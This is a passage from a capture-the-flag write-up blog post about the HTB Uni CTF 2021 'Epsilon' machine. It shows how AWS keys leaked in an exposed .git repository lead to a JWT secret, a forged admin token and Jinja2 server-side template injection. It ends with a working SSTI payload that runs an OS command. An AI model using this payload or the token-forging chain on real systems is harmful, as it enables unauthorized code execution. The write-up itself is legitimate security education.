|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
| http-git:
|   10.129.96.99:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>There is a .git on 80 and some kind of web application on port 5000:</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/5000.png" alt="screenshot of the webapp on port 5000"></p>
<p>We didn’t manage to find anything on that web app so let’s get a look at that <a href="git-repo.zip">.git</a>.</p>
<p>There are two files (server.py and track_api_CR_148.py) in five commits. The commits are about adding and updating the ‘Tracking API Module’ a typo (‘epsilong’ vs. ‘epsilon’) and the addition of the custome site. </p>
<p>In the first commit we can find the data to use the lambda client:</p>
<pre><code class="python">session = Session(
    aws_access_key_id=&#39;AQLA5M37BDN6FJP76TDC&#39;,
    aws_secret_access_key=&#39;OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A&#39;,
    region_name=&#39;us-east-1&#39;,
    endpoint_url=&#39;http://cloud.epsilong.htb&#39;)
aws_lambda = session.client(&#39;lambda&#39;)    
</code></pre>
<p><em>/processed_git/0_[…]/track_api_CR_148.py</em></p>
<p>Using <code>aws configure</code> we can use this data for authorization in our aws lambda client.<br>Actually this got us access to the cloud:</p>
<pre><code class="bash"># aws lambda list-functions --endpoint-url http://cloud.epsilon.htb                              
&#123;
    &quot;Functions&quot;: [
        &#123;
            &quot;FunctionName&quot;: &quot;costume_shop_v1&quot;,
            &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&quot;,
            &quot;Runtime&quot;: &quot;python3.7&quot;,
            &quot;Role&quot;: &quot;arn:aws:iam::123456789012:role/service-role/dev&quot;,
            &quot;Handler&quot;: &quot;my-function.handler&quot;,
            &quot;CodeSize&quot;: 478,
            &quot;Description&quot;: &quot;&quot;,
            &quot;Timeout&quot;: 3,
            &quot;LastModified&quot;: &quot;2021-11-21T14:05:37.391+0000&quot;,
            &quot;CodeSha256&quot;: &quot;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&quot;,
            &quot;Version&quot;: &quot;$LATEST&quot;,
            &quot;VpcConfig&quot;: &#123;&#125;,
            &quot;TracingConfig&quot;: &#123;
                &quot;Mode&quot;: &quot;PassThrough&quot;
            &#125;,
            &quot;RevisionId&quot;: &quot;1a5e201a-c8f3-4c1a-ad6d-366dc7ca3d33&quot;,
            &quot;State&quot;: &quot;Active&quot;,
            &quot;LastUpdateStatus&quot;: &quot;Successful&quot;,
            &quot;PackageType&quot;: &quot;Zip&quot;
        &#125;
    ]
&#125;
</code></pre>
<p>The costume_shop seems to be related to the web application running on port 5000.<br>Let’s have a closer look:</p>
<pre><code class="bash"># aws lambda get-function --function-name costume_shop_v1 --endpoint-url http://cloud.epsilon.htb 
&#123;
    &quot;Configuration&quot;: &#123;
        &quot;FunctionName&quot;: &quot;costume_shop_v1&quot;,
        &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&quot;,
        &quot;Runtime&quot;: &quot;python3.7&quot;,
        &quot;Role&quot;: &quot;arn:aws:iam::123456789012:role/service-role/dev&quot;,
        &quot;Handler&quot;: &quot;my-function.handler&quot;,
        &quot;CodeSize&quot;: 478,
        &quot;Description&quot;: &quot;&quot;,
        &quot;Timeout&quot;: 3,
        &quot;LastModified&quot;: &quot;2021-11-21T14:05:37.391+0000&quot;,
        &quot;CodeSha256&quot;: &quot;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&quot;,
        &quot;Version&quot;: &quot;$LATEST&quot;,
        &quot;VpcConfig&quot;: &#123;&#125;,
        &quot;TracingConfig&quot;: &#123;
            &quot;Mode&quot;: &quot;PassThrough&quot;
        &#125;,
        &quot;RevisionId&quot;: &quot;1a5e201a-c8f3-4c1a-ad6d-366dc7ca3d33&quot;,
        &quot;State&quot;: &quot;Active&quot;,
        &quot;LastUpdateStatus&quot;: &quot;Successful&quot;,
        &quot;PackageType&quot;: &quot;Zip&quot;
    &#125;,
    &quot;Code&quot;: &#123;
        &quot;Location&quot;: &quot;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&quot;
    &#125;,
    &quot;Tags&quot;: &#123;&#125;
&#125;
</code></pre>
<p>Nice! We found some code on the webpage at the provided link:</p>
<pre><code class="js">import json

secret=&#39;RrXCv`mrNe!K!4+5`wYq&#39; #apigateway authorization for CR-124

&#39;&#39;&#39;Beta release for tracking&#39;&#39;&#39;
def lambda_handler(event, context):
    try:
        id=event[&#39;queryStringParameters&#39;][&#39;order_id&#39;]
        if id:
            return &#123;
               &#39;statusCode&#39;: 200,
               &#39;body&#39;: json.dumps(str(resp)) #dynamodb tracking for CR-342
            &#125;
        else:
            return &#123;
                &#39;statusCode&#39;: 500,
                &#39;body&#39;: json.dumps(&#39;Invalid Order ID&#39;)
            &#125;
    except:
        return &#123;
                &#39;statusCode&#39;: 500,
                &#39;body&#39;: json.dumps(&#39;Invalid Order ID&#39;)
            &#125;
</code></pre>
<p><em>lambda_function.py</em></p>
<p>The secret we see there is used for the jwt on port 5000. We can use this to craft our own token:</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/epsilon_jwt.png" alt="jwt.io showing the self crafted token"></p>
<p>The <code>server.py</code> tells us we should be allowed to visit the <code>/order</code> page by using the crafted jwt token as an auth cookie now:</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/helloadmin.png" alt="screenshot of the web page /order with &#39;Welcome Admin&#39; and the order form"></p>
<p>Let`s have a closer look how to step further:</p>
<pre><code class="py">@app.route(&#39;/order&#39;,methods=[&quot;GET&quot;,&quot;POST&quot;])
def order():
    if verify_jwt(request.cookies.get(&#39;auth&#39;),secret):
        if request.method==&quot;POST&quot;:
            costume=request.form[&quot;costume&quot;]
            message = &#39;&#39;&#39;
            Your order of &quot;&#123;&#125;&quot; has been placed successfully.
            &#39;&#39;&#39;.format(costume)
            tmpl=render_template_string(message,costume=costume)
            return render_template(&#39;order.html&#39;,message=tmpl)
        else:
            return render_template(&#39;order.html&#39;)
    else:
        return redirect(&#39;/&#39;,code=302)
app.run(debug=&#39;true&#39;)
</code></pre>
<p><em>server.py</em></p>
<p>The <code>costume</code> is received as a POSTed parameter from the order and then rendered into the returned page.</p>
<p>This gives us the chance to try some SSTI here:</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/burp_costume.png" alt="screenshot of burp with SSTI"></p>
<p>As you can see we managed to get code execution. From that point you are free to use this entry for anything further, but to get the flag you can just use this payload:</p>
<p><code>costume=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /var/www/flag.txt').read()&#125;&#125;&amp;q=1&amp;addr=1</code></p>
<p> // much work of the aws stuff at the beginning was done by <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/106666">Fabian</a> from TeamWBH</p>
<p> Thanks for reading. ~ <a target="_blank" rel="noopener" href="https://twitter.com/hexp_">hexp</a> and <a target="_blank" rel="noopener" href="https://twitter.com/JeanWhisky">JeanWhisky</a></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2021/10/27/Auth0-CTF/" title="Auth0 - CTF"><span class="has-text-weight-semibold">Next: Auth0 - CTF</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="NocentSec/nocentsec.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/NocentSec"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> NocentSec 2021</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>